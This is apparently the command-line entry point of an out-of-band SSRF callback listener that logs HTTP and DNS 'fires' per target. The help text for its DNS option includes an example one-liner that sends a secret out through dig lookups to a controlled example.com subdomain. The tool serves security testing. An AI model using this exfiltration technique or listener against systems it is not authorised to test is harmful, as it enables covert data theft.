import argparse
from sqlalchemy import exc
from db import db, create_db
from server import app

targets = {}

create_db(app)
from models import Target, Fire

from dnslistener import start_server as startdns
from server import start_listener, print_fire

def create_parser():
    parser = argparse.ArgumentParser(description='HTTP listener for SSRF fires.')
    parser.add_argument('-n', '--target-name', nargs='?', help='The name of the to be added target', default=None)
    parser.add_argument('-d', '--target-domain', nargs='?', help='The domain of the to be added target. It\'s optional, but becomes useful when a payload fires after a a weeks of delay.', default=None)
    parser.add_argument('-sf', '--show-fires', nargs='?', const=25)
    parser.add_argument('-st', '--show-targets', nargs='?', const=25)
    parser.add_argument('-dns', '--dns', nargs=1, help='Domain that you control that has NS records pointing to this machine. eg. dns.example.com. Then, if you want to exfiltrate data from the server use payload.target.dns.example.com. Example exfiltration method: SECRET=$(echo "secret") | dig $SECRET.target123.dns.example.com')
    parser.add_argument('-nh', '--no-http')
    args = parser.parse_args()
    return args

def show_fires(last=25):
    fires = Fire.query.limit(last).all()
    print('[*][*] Fires')
    for fire in fires:
        print_fire(fire.date.strftime("%Y-%m-%d %H:%M"), fire.target.name, fire.target.domain, 'DNS' if fire.dns_fire else 'HTTP', fire.payload, fire.headers)
    return fires

def show_targets(last=25):
    targets = Target.query.limit(last).all()
    print('[*][*] Targets')
    for target in targets:
        fires = len(Fire.query.filter_by(target=target).all())
        print(f'[*] Target name: {target.name}\n[*] Target domain: {target.domain}\n[*] Fires: {fires}')
    return targets


def create_target(name, domain):
    if name is not None:
        target = Target(name=name, domain=domain)
        try:
            db.session.add(target)
            db.session.commit()
        except exc.IntegrityError:
            # name must be unique
            db.session.rollback()
            print(f'[*] target with name {name} is already present')


if __name__ == "__main__":
    args = create_parser()
    name = args.target_name
    domain = args.target_domain

    create_target(name, domain)

    
    if args.show_fires:
        show_fires(args.show_fires)
    if args.show_targets:
        show_targets(args.show_targets)
    if args.dns:
        startdns(args.dns[0])
    if args.no_http is None:
        start_listener()
